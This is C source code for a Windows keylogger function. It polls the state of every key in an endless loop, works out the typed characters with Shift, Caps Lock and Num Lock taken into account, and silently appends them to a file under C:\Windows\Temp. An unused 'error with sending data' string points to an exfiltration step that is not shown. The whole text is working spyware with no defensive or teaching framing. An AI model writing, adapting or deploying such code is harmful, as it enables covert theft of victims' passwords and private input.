DWORD WINAPI logg(){
    int vkey, last_key_state[0xFF];
    int isCAPSLOCK, isNUMLOCK, isLSHIFT, isRSHIFT;
    int isPressed;
    char showKey;
    char NUMCHAR[] = ")!@#$%^&*(";
    char chars_vn[] = ";=,-./`";
    char chars_vs[] = ":+<_>?~";
    char chars_va[] = "[\\]\';";
    char chars_vb[] = "{|}\"";
    char err[] = "[!] Error with sending data\n";
    FILE *file;
    char KEY_LOG_FILE[] = "C:\\Windows\\Temp\\data.txt";
    for (vkey = 0; vkey < 0xFF; vkey++){
        last_key_state[vkey] = 0;
    }

    while (1){
        Sleep(10);
        
        isCAPSLOCK = (GetKeyState(0x14) & 0x0001) != 0 ? 1 : 0;
        isNUMLOCK = (GetKeyState(0x90) & 0x0001) != 0 ? 1 : 0;
        isLSHIFT = (GetKeyState(0xA0) & 0x8000) != 0 ? 1 : 0;
        isRSHIFT = (GetKeyState(0xA1) & 0x8000) != 0 ? 1 : 0;

        for (vkey = 0; vkey < 0xFF; vkey++){
            isPressed = (GetAsyncKeyState(vkey)  & 0x8000) != 0 ? 1 : 0;
            showKey = (char)vkey;
            if (isPressed == 1 && last_key_state[vkey] == 0){

                if (vkey >= 0x41 && vkey <= 0x5A){
                    if (isCAPSLOCK == 0){
                        if (isLSHIFT == 0 && isRSHIFT == 0){
                            showKey += 0x20;
                        }
                    }
                    else if (isLSHIFT == 1 || isRSHIFT == 1){
                        showKey += 0x20;
                    }
                }
                else if(vkey >= 0x30 && vkey <= 0x39){
                    if(isLSHIFT == 1 || isRSHIFT == 1){
                        showKey = NUMCHAR[vkey - 0x30];
                    }
                }
                else if(vkey >= 0x60 && vkey <= 0x69 && isNUMLOCK == 1){
                    showKey = (char)(vkey - 0x30);
                }
                else if(vkey >= 0xBA && vkey <= 0xC0){
                    if(isLSHIFT == 1 || isRSHIFT == 1){
                        showKey = chars_vs[vkey - 0xBA];
                    }
                    else{
                        showKey = chars_vn[vkey - 0xBA];
                    }
                }
                else if(vkey >= 0xDB && vkey <= 0xDF){
                    if(isLSHIFT == 1 || isRSHIFT == 1){
                        showKey = chars_vb[vkey - 0xDB];
                    }
                    else{
                        showKey = chars_va[vkey - 0xDB];
                    }
                }
                else if (vkey == 0x0D){
                    showKey = (char)0x0A;
                }
                else if (vkey >= 0x6A && vkey <= 0x6F){
                    showKey = (char)(vkey - 0x40);
                }
                else if(vkey != 0x20 && vkey != 0x09){
                    showKey = (char)0x00;
                }

                if (showKey != (char)0x00){
                    file = fopen(KEY_LOG_FILE, "a");
                    if (file != NULL) {
                        fprintf(file, "%c", showKey);
                        fclose(file);
                    }
                }

            }
            last_key_state[vkey] = isPressed;
        }

    }
}
